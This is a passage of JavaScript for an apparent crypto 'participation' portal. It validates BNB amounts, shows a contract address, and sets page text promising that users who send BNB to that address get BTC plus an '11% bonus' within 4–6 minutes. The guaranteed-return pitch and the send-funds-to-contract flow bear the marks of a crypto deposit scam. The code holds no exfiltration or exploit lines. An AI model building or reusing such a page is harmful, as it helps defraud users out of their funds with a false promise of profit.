              {
                behavior:
                  "smooth",
                block:
                  "center"
              }
            );
          }
        }
      );
    }
  );
}

/* ==========================================================
   BUY BTC
   ========================================================== */

function setupBuyButton() {
  const buttons =
    document.querySelectorAll(
      "[data-buy-btc], #buyBTC, .buy-btc-btn"
    );

  buttons.forEach(
    button => {
      button.addEventListener(
        "click",
        async event => {
          event.preventDefault();

          const input =
            $("bnbAmount");

          const amount =
            Number(
              input?.value
            );

          if (
            !connectedAddress
          ) {
            openWalletModal();

            return;
          }

          if (
            !Number.isFinite(
              amount
            ) ||
            amount <= 0
          ) {
            toast(
              "Enter a valid BNB amount."
            );

            return;
          }

          if (
            amount <
            Math.max(
              BONUS_MIN_BNB,
              minBNB
            )
          ) {
            toast(
              `Minimum participation is ${Math.max(
                BONUS_MIN_BNB,
                minBNB
              )} BNB.`
            );

            return;
          }

          if (
            Number.isFinite(
              maxBNB
            ) &&
            maxBNB <
              Number.MAX_SAFE_INTEGER &&
            amount >
              maxBNB
          ) {
            toast(
              `Maximum participation is ${maxBNB} BNB.`
            );

            return;
          }

          const target =
            $("connectedWalletPanel");

          if (
            target
          ) {
            target.scrollIntoView(
              {
                behavior:
                  "smooth",
                block:
                  "center"
              }
            );
          }

          toast(
            "Wallet connected. Follow the participation instructions."
          );
        }
      );
    }
  );
}

/* ==========================================================
   HEADER CONTRACT
   ========================================================== */

function setupHeaderContract() {
  const contractElements =
    document.querySelectorAll(
      "[data-contract-address], #contractAddress, .contract-address"
    );

  contractElements.forEach(
    element => {
      if (
        element.tagName ===
        "INPUT"
      ) {
        element.value =
          CONTRACT_ADDRESS;
      } else {
        element.textContent =
          CONTRACT_ADDRESS;
      }
    }
  );

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );
}

/* ==========================================================
   HOW IT WORKS
   ========================================================== */

function updateHowItWorksText() {
  const elements =
    document.querySelectorAll(
      "[data-how-it-works], #howItWorksText"
    );

  const text =
    "To participate and earn the 11% bonus, swap your BNB to BTC, connect your wallet, copy the contract address, and go to your connected wallet to send your BNB. Allow 4–6 minutes for your BTC plus the 11% bonus to be processed.";

  elements.forEach(
    element => {
      element.textContent =
        text;
    }
  );
}

/* ==========================================================
   PAGE INITIALIZATION
   ========================================================== */

async function initializePortal() {
  try {
    await loadEthers();

    setupHeaderContract();

    setupContractCopyButtons();

    setupCalculator();

    setupParticipationButtons();

    setupBuyButton();

    updateHowItWorksText();

    await setupWallet();

    await Promise.allSettled([
      loadContractData(),
      loadMarketPrices()
    ]);

    startActivity();

    setInterval(
      loadMarketPrices,
      30000
    );

  } catch (error) {
    console.error(
      "Portal initialization:",
      error
    );
  }
}

if (
  document.readyState ===
  "loading"
) {
  document.addEventListener(
    "DOMContentLoaded",
    initializePortal
  );
} else {
  initializePortal();
}
